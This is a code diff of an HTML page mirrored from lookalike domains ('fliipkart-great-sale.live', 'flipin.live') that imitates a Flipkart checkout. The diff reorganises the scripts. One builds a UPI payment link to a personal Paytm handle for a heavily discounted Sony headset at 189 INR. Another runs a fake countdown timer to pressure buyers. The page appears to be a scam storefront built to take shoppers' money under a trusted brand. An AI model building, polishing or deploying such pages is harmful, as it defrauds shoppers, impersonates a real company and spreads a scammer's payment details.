@@ -1,36 +1,47 @@
 
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Online Shopping</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/x-icon" href="assets/imgs/theme/Flipkart-Logo-removebg-preview-300x300.png">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <link href="pdata/app.f814fe546268e6ed07f2.css" rel="stylesheet" type="text/css">
+    
+    <!-- Include other CSS files here -->
 
-    const pytm = "upi://pay?pa=8468966897@paytm&";
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
-    
-    </script><html class="no-js" lang="en">
-    
-    
-    
-    <!-- Mirrored from fliipkart-great-sale.live/upis4/annap/cart1.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Jun 2023 18:42:18 GMT -->
-    <!-- Added by HTTrack -->
-    <!-- Mirrored from flipin.live/annap/cart1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jul 2023 06:14:55 GMT -->
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-    <head>
-        <meta charset="utf-8">
-        <title>Online Shopping</title>
-        <meta http-equiv="x-ua-compatible" content="ie=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="shortcut icon" type="image/x-icon" href="assets/imgs/theme/Flipkart-Logo-removebg-preview-300x300.png">
-        <link rel="stylesheet" href="assets/css/main.css">
-            <link href="pdata/app.f814fe546268e6ed07f2.css" rel="stylesheet" type="text/css">
-        <link href="pdata/common.2dafadc599c3ab3b2fc3.css" rel="stylesheet" type="text/css">
-        <link href="pdata/paymentoptions.5c0205604e6b9c69157c.css" rel="stylesheet" type="text/css">
-        <link type="text/css" rel="stylesheet" href="pdata/cardpayments.0011fbe554b1ddcabea0.css">
-        <link type="text/css" rel="stylesheet" href="pdata/netbanking.3522e90ebab07899e433.css">
-        <link type="text/css" rel="stylesheet" href="pdata/emi.2a61b24f78647dab2aa8.css">
-        
-        <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.html"></script>
-        <script src="http://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    </head>
+    <!-- Include other JavaScript files here -->
+
+    <script>
+        const pytm = "upi://pay?pa=8468966897@paytm&";
+
+        // Define JavaScript functions here, e.g., myFunction, startTimer, etc.
+        function myFunction() {
+            if (document.getElementById('radio1').checked) {
+                document.getElementById('linkid').href = pytm + "pn=ServiceStation&tn=SONY WI-C310 Bluetooth Headset&am=189&cu=INR&mode=02&tr";
+            }
+        }
+
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.text(minutes + "min " + seconds + "sec");
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+    </script>
+
+</head>
     
     <body>
     
@@ -667,49 +678,7 @@
     
     <!-- Mirrored from flipin.live/annap/cart1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jul 2023 06:14:55 GMT -->
     </html>   </body>
-    <script>
-    function startTimer(duration, display) {
-    var timer = duration, minutes, seconds;
-    setInterval(function () {
-    minutes = parseInt(timer / 60, 10);
-    seconds = parseInt(timer % 60, 10);
     
-    minutes = minutes < 10 ? "0" + minutes : minutes;
-    seconds = seconds < 10 ? "0" + seconds : seconds;
-    
-    display.text(minutes + "min " + seconds+ "sec" );
-    
-    if (--timer < 0) {
-        timer = duration;
-    }
-    }, 1000);
-    }
-    </script></body>
-    <script type="text/javascript">
-    $(function() {
-    $('#product-rating').barrating({
-    theme: 'fontawesome-stars'
-    });
-    $('product-rating').barrating('show');
-    $('product-rating').barrating('set', '4');
-    });
-    $( document ).ready(function() {
-    
-    startTimer(500-120, $('#offerend-time'));
-    });
-    </script>
-    <script>
-        function myFunction() {
-    
-            if(document.getElementById('radio1').checked) {
-                document.getElementById('linkid').href = pytm+"pn=ServiceStation&tn=SONY WI-C310 Bluetooth Headset&am=189&cu=INR&mode=02&tr'";
-            }
-    
-         
-    
-          
-        }
-    </script>
     </html>
     
     
